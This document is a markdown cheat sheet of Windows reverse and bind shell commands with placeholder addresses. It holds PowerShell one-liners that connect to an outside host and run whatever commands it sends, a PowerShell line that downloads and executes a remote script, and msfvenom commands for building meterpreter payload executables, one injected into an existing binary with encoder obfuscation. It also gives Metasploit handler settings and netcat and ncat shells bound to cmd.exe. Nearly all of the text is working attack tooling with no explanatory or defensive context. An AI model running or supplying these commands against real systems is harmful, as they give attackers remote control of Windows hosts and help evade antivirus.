# Windows Shells

## Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IP]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString("[IP]/[FILE.PS1]")
```


## Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o [NAME].exe
```
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > [NAME].exe
```
```bash
use exploit/multi/handler
```
```bash
set payload windows/meterpreter/reverse_tcp
```

##### Stageless
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o [NAME].exe
```
```bash
use exploit/multi/handler
```
```bash
set payload windows/shell_reverse_tcp
```

##### Staged (Bad OPSEC)
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o [NAME].exe
```
```bash
use exploit/multi/handler
```
```bash
set payload windows/shell/reverse_tcp
```

##### Binary Injection
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -e x86/shikata_ga_nai -i 9 -x "/[BINARY].exe" -o [NAME].exe
```


## Netcat

##### Listener
```bash
nc.exe -nlvp [PORT] -e cmd.exe
```
##### Shell
```bash
nc.exe [IP] [PORT] -e cmd.exe
```

## Ncat

##### Listener
```bash
ncat --exec cmd.exe --allow [IP] -vnl [PORT] --ssl
```
##### Shell
```bash
ncat -nv [IP] [PORT]
```
